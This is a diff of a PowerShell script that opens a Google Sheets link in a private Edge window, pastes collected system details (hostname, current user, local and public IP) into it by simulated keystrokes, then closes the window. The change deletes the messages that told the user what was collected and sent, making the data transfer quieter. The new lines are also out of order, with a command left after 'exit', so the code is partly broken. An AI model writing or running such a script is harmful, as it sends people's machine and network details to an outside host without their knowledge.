@@ -37,13 +37,13 @@ $url = "https://docs.google.com/spreadsheets/d/1y-JfdAlbl4Ffda0fjuDjReL6NS_-zP9s
 Start-Process "msedge" -ArgumentList "-inprivate", $url
 
 # Wait for the browser to open and load the page
-Start-Sleep -Seconds 7
+Start-Sleep -Seconds 5
 
 # Select cell A1 and paste all values at once
 Send-Keys "^v"  # Paste all values
 
 # Wait a moment to ensure pasting is complete
-Start-Sleep -Seconds 1
+Start-Sleep -Seconds 0.5
 
 # Handle any final dialogue boxes
 Send-Keys "{ENTER}"
@@ -51,11 +51,6 @@ Start-Sleep -Seconds 1
 
 # Close the browser window
 Send-Keys "%{F4}"  # Alt+F4 to close the window
-
-Write-Host "Script completed. The incognito window should now be closed."
-Write-Host "The following information was collected and pasted:"
-Write-Host "Hostname: $hostname"
-Write-Host "Current User: $currentUser"
-Write-Host "Date and Time: $dateTime"
-Write-Host "Local IP: $localIP"
-Write-Host "Public IP: $publicIP"
+Set-Clipboard $allValues
+exit
+Send-Keys "{ENTER}"
